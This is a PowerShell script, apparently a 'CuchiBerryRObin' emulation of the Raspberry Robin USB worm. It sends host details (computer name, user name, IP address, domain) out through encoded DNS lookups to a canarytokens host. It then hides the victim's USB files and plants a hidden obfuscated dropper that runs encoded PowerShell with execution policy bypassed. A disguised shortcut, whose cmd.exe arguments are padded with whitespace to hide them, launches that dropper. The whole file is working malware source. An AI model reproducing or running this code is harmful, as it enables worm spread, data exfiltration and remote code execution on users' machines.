

$Conf_Ballon=$True
$Conf_CharSet="ESETOROENAMORADODELALUNA"
$Conf_dnsToken ="pb6fy865rm7ts4ran9qi2ss2q.canarytokens.com"



if ($Conf_Ballon -eq $True) {
 
#MENSJAE DE USB PROCESADO
$Title = "CuchiBerryRObin"
$Message = "USB Insertado"
$Type = "info" 
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)

#Mensaje para logging
Add-Content -Path "$env:APPDATA\cuchirobinoutput.log" -Value "$(Get-Date) - USB Flash Drive was inserted.";

}





#consige la unidad 

Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 } | Where-Object { $_.Label -ne "EFI" } | ForEach-Object {
    #Write-Host "Letter is" + $_.DriveLetter + "label is " + $_.Label
    $driveLetter = $_.DriveLetter
    $label = $_.Label
    if ([string]::IsNullOrEmpty($label)) {
        $label = "USB" # Espacio en blanco en lugar de "USB" para mantener consistencia
    }
    Write-Host "Letter is" + $_.DriveLetter + "label is " + $_.Label
    
}

# Verificar si driveLetter y label están vacíos
if ([string]::IsNullOrEmpty($driveLetter) -or [string]::IsNullOrEmpty($label)) {
    Write-Error "Error: No se pudo obtener la letra de unidad o etiqueta del USB"
    exit
}

Write-Host "Letra de unidad: $driveLetter"
Write-Host "Etiqueta: $label"

#Add-Content -Path $PSScriptRoot\output.txt -Value "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter .";
Write-Host "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter "

#Notificamos la Entrada al CNC
$ipAddress = (Test-Connection -ComputerName localhost -Count 1).IPv4Address.IPAddressToString

$texto = "USB_IN_$driveLetter$Label$env:COMPUTERNAME.$env:USERNAME.$ipAddress.$env:USERDNSDOMAIN."

[byte[]] $bytes = [System.Text.Encoding]::ASCII.GetBytes($texto)


$byteArrayAsBinaryString = -join $bytes.ForEach{        [Convert]::ToString($_, 2).PadLeft(8, '0')    }
$byteArrayAsBinaryString = $($byteArrayAsBinaryString+("0000".Substring(0,5-($byteArrayAsBinaryString.length%5))))
$Base32Secret = [regex]::Replace($byteArrayAsBinaryString, '.{5}', {        param($Match)        'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'[[Convert]::ToInt32($Match.Value, 2)]    }).Replace("=","")
$randomDigits = Get-Random -Minimum 10 -Maximum 100
$splitData = [System.Text.RegularExpressions.Regex]::Split($base32Secret, "(?<=\G.{63})") | Where-Object { $_ -ne "" } 
$splitData= $splitData -join "."
$encodedData = $splitData  + ".G$randomDigits." + $Conf_dnsToken


$result = Resolve-DnsName -Name $encodedData


# Set the path to the folder you want to work with
$folderPath = "$driveLetter"

# Create a subfolder
$subfolderPath = Join-Path -Path $folderPath -ChildPath "$label"



# Asegurarse de que la ruta es válida y existe
if(!(Test-Path -PathType Container $subfolderPath)) {
    try {
        New-Item -ItemType Directory -Path $subfolderPath -Force -ErrorAction Stop
        Write-Host "Directorio creado: $subfolderPath"
    } catch {
        Write-Error "No se pudo crear el directorio: $_"
        return
    }
} else {
    Write-Host "El directorio ya existía: $subfolderPath"
}


# Copy all files to the subfolder except the subfolder itself, hidden files and shortcuts

    Get-ChildItem -Path $folderPath | Where-Object { 
        $_.FullName -ne $subfolderPath -and 
        !($_.Attributes -band [System.IO.FileAttributes]::Hidden) -and 
        !($_.Extension -eq ".lnk")
    } | ForEach-Object {
        Write-Host "Moviendo archivo/carpeta: $($_.FullName)"
        if($_.PSIsContainer) {
            # Si es una carpeta, copiamos su contenido y luego la eliminamos
            Copy-Item -Path $_.FullName -Destination $subfolderPath -Force -Recurse
            Remove-Item -Path $_.FullName -Force -Recurse
        } else {
            # Si es un archivo, lo movemos directamente
            Move-Item -Path $_.FullName -Destination $subfolderPath -Force
        }
    }


# Make the subfolder invisible
$attrib = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

(Get-Item $subfolderPath -Force).Attributes = $attrib


 

#CREANDO LNK Y DROPPER
# Set the path to the file you want to create a shortcut for
$targetPath = "cmd.exe"
$dropperName = -join ((Get-Random -Count 3 -InputObject  $Conf_CharSet.ToCharArray())) + "." + -join ((Get-Random -Count 3 -InputObject $Conf_CharSet.ToCharArray()))
$dropperPath = $driveLetter + "\"+$dropperName



#CREANDO DROPPER

# Generamos una cadena aleatoria de caracteres para escribir en el archivo
$caracteres = "abcdefghijklmnopqrstuvwxyz0123456789"

$caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`r`n"

$aleatorios = ""
for ($i = 1; $i -le 5024; $i++) {
    $indice = Get-Random -Minimum 0 -Maximum $caracteres.Length
    $aleatorios += [char]::ConvertFromUtf32($caracteres[$indice])
}



$aleatorios | Out-File -FilePath "$dropperPath"


#[System.IO.File]::WriteAllBytes("$dropperPath", $aleatorios)


Write-Host $dropperPath

# Escribimos "mspaint" en una línea aleatoria del archivo
$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
$lineas[$indice] = " start explorer	\`"$label\`" "
$lineas | Set-Content "$dropperPath"


# Escribimos "Dropper" en una línea aleatoria del archivo
#$lineas = Get-Content $dropperPath
$indice = Get-Random -Minimum 0 -Maximum $lineas.Count
#
$downloader="A reemplazar por el configurator"
$lineas[$indice] = "Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded $downloader "

$lineas | Set-Content "$dropperPath"
#Hago el dropper protegido
Set-ItemProperty $dropperPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System -bor [System.IO.FileAttributes]::ReadOnly)



# Escribimos más caracteres absurdos
#Add-Content "$dropperPath" "$caracteres"





# Set the path to where you want to create the shortcut
$shortcutPath = "$driveLetter\$label.lnk"

# Set the character set to use for the random string
$charSet = "CUCHIBERRYROBIN"

# Generate a random string of length 100 using the character set
$description = -join ((Get-Random -Count 100 -InputObject $charSet.ToCharArray()))

# Create a WScript.Shell object
$shell = New-Object -ComObject WScript.Shell

# Create the shortcut
$shortcut = $shell.CreateShortcut($shortcutPath)

# Set the shortcut properties
# Set the path to the file you want to create a shortcut for
$targetPath = "C:\Windows\System32\cmd.exe"
$shortcut.RelativePath = ""
$shortcut.TargetPath = $targetPath
$shortcut.WindowStyle = 7
$shortcut.Description = $description
# Set the icon to the removable drive icon
$iconLocation = "%SystemRoot%\System32\imageres.dll,27"
$shortcut.IconLocation = $iconLocation
# Set the arguments to run the command from the arg file
$shortcut.Arguments = "
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
               
          /V/RcmD<$dropperName"

# Save the shortcut
$shortcut.Save()



if ($Conf_Ballon -eq $True) {

#MENSJAE DE USB PROCESADO
$Title = "CuchiBerryRObin"
$Message = "USB CuchiRobineado"
#$Type = "info" 
$Type = "Warning" # Puedes usar: None, Info, Warning, Error
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
   
}
